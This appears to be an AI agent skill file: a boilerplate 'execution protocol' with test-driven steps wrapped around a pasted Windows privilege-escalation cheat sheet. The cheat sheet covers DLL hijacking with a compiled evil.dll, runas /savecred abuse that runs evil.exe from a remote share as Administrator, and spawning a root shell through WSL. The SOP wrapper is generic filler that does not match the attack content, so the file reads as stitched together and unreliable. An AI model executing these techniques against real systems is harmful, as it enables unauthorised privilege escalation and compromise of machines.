---
name: 6-additional-techniques
description: Use when executing 6 additional techniques protocols within the security sector.
---

# 6 Additional Techniques: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing 6 Additional Techniques. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core 6 additional techniques logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# 6. Additional Techniques

#### DLL Hijacking
```powershell
# Find missing DLLs with Process Monitor
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Compile malicious DLL
# For x64: x86_64-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
# For x86: i686-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
```

#### Runas with Saved Credentials
```powershell
# List saved credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:Administrator "cmd.exe /k whoami"
runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\share\evil.exe"
```

#### WSL Exploitation
```powershell
# Check for WSL
wsl whoami

# Set root as default user
wsl --default-user root
# Or: ubuntu.exe config --default-user root

# Spawn shell as root
wsl whoami
wsl python -c 'import os; os.system("/bin/bash")'
```

## Quick Reference